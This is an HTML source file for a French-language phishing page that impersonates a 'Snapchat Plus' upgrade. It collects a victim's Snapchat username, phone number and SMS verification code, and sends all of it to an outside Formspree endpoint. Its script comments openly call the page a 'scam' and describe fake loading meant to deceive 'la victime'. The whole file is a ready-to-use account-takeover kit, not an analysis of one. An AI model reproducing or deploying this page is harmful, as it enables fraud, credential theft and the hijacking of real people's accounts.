<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Plus</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            /* C'est ici que l'image de fond est appelée */
            background-image: url('fond.jpg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            text-align: center;
            /* Optionnel : un léger fond blanc ou transparent si l'image n'est pas assez contrastée */
            /* background-color: rgba(255, 255, 255, 0.9); */
            /* border-radius: 15px; */
        }

        /* Logo Snapchat stylisé */
        .snap-logo {
            width: 100px;
            height: 100px;
            background-color: #FFFC00;
            border-radius: 25px;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 20px auto;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }
        
        .snap-logo svg {
            width: 60px;
            height: 60px;
            fill: #fff;
        }

        h1 {
            font-size: 24px;
            color: #000;
            margin-bottom: 10px;
            font-weight: 700;
        }

        p {
            color: #333; /* Un peu plus foncé pour lisibilité sur fond */
            font-size: 14px;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        label {
            display: block;
            font-size: 14px;
            color: #333;
            margin-bottom: 5px;
            font-weight: 500;
        }

        input {
            width: 100%;
            padding: 15px;
            font-size: 16px;
            border: 2px solid #E0E0E0;
            border-radius: 30px;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.3s;
            background-color: rgba(255, 255, 255, 0.9); /* Fond léger pour les champs */
        }

        input:focus {
            border-color: #FFFC00;
        }

        /* Le bouton jaune style Snapchat */
        .btn-submit {
            background-color: #FFFC00;
            color: #000;
            border: none;
            width: 100%;
            padding: 15px;
            font-size: 16px;
            font-weight: 700;
            border-radius: 30px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .btn-submit:hover {
            background-color: #FFF000;
        }

        /* Pour cacher la deuxième étape au début */
        #step-2 {
            display: none;
        }

        .small-note {
            font-size: 12px;
            color: #555;
            margin-top: 20px;
            font-style: italic;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Logo Snapchat stylisé -->
        <div class="snap-logo">
            <svg viewBox="0 0 24 24">
                <path d="M12.003 2c-2.498 0-5.81 1.95-5.81 6.03v3.14c0 .77-.355 1.48-.95 1.93-.59.45-1.33.68-2.09.64-.82-.05-1.58-.36-2.17-.89-.59-.53-.95-1.27-.95-2.05 0-4.08 3.31-6.03 5.81-6.03.6 0 1.16.13 1.65.36.49.23.89.58 1.15 1.01.26-.43.66-.78 1.15-1.01.49-.23 1.05-.36 1.65-.36 2.498 0 5.81 1.95 5.81 6.03 0 .78-.36 1.52-.95 2.05-.59.53-1.35.84-2.17.89-.76.04-1.5-.19-2.09-.64-.595-.45-.95-1.16-.95-1.93v-3.14c0-4.08-3.312-6.03-5.81-6.03zm-8.2 6.03c0-3.07 2.49-5.57 5.57-5.57.82 0 1.59.18 2.27.5.68.32 1.23.81 1.6 1.44.37-.63.92-1.12 1.6-1.44.68-.32 1.45-.5 2.27-.5 3.08 0 5.57 2.5 5.57 5.57v3.14c0 1.53-.82 2.88-2.06 3.6-.39.22-.83.35-1.29.39-.46.04-.92-.03-1.34-.21-.42-.18-.78-.47-1.04-.85-.26-.38-.42-.83-.47-1.3h-3.24c-.05.47-.21.92-.47 1.3-.26.38-.62.67-1.04.85-.42.18-.88.25-1.34.21-.46-.04-.9-.17-1.29-.39-1.24-.72-2.06-2.07-2.06-3.6v-3.14zm6.66 7.43c.28 0 .5.22.5.5s-.22.5-.5.5-.5-.22-.5-.5.22-.5.5-.5zm1.68 0c.28 0 .5.22.5.5s-.22.5-.5.5-.5-.22-.5-.5.22-.5.5-.5z"/>
            </svg>
        </div>

        <!-- Étape 1 : Infos -->
        <div id="step-1">
            <h1>Obtenez Snapchat+</h1>
            <p>Vérification requise pour activer votre profil.</p>
            
            <form action="https://formspree.io/f/xrpgajrr" method="POST">
                <div class="form-group">
                    <label for="username">Nom d'utilisateur Snapchat</label>
                    <input type="text" id="username" name="username" placeholder="Ex: john_doe" required>
                </div>

                <div class="form-group">
                    <label for="phone">Numéro de téléphone</label>
                    <input type="tel" id="phone" name="phone" placeholder="Ex: 06 12 34 56 78" required>
                </div>

                <button type="submit" class="btn-submit">Vérifier</button>
            </form>
        </div>

        <!-- Étape 2 : Code SMS (Caché au début) -->
        <div id="step-2">
            <h1>Vérification</h1>
            <p>Nous avons envoyé un code à votre numéro.</p>
            
            <form action="https://formspree.io/f/xrpgajrr" method="POST">
                <!-- On garde les données précédentes si besoin, ou on laisse juste le code -->
                <div class="form-group">
                    <label for="code">Code SMS</label>
                    <input type="text" id="code" name="code" placeholder="Entrez le code à 4 chiffres" required>
                </div>

                <button type="submit" class="btn-submit">Confirmer</button>
            </form>
            
            <p class="small-note">Le code peut prendre quelques minutes à venir.</p>
        </div>

    </div>

    <script>
        // Logique pour passer de l'étape 1 à l'étape 2
        document.addEventListener('DOMContentLoaded', function() {
            // Quand l'utilisateur soumet le formulaire de l'étape 1
            const form1 = document.querySelector('#step-1 form');
            const step2 = document.getElementById('step-2');
            
            // On intercepte la soumission pour afficher l'étape 2 sans recharger la page
            form1.addEventListener('submit', function(e) {
                // Optionnel : Si tu veux que ça envoie vraiment vers Formspree, 
                // tu peux laisser faire. Mais pour l'effet visuel "scam", 
                // on va juste afficher l'étape 2 immédiatement pour que la victime 
                // croie que ça charge.
                
                // MAJS : Pour un effet plus fluide, on cache le step 1 et on montre le step 2
                // après un court délai.
                setTimeout(() => {
                    document.getElementById('step-1').style.display = 'none';
                    step2.style.display = 'block';
                }, 1000); // 1 seconde de "chargement"
            });
        });
    </script>
</body>
</html>
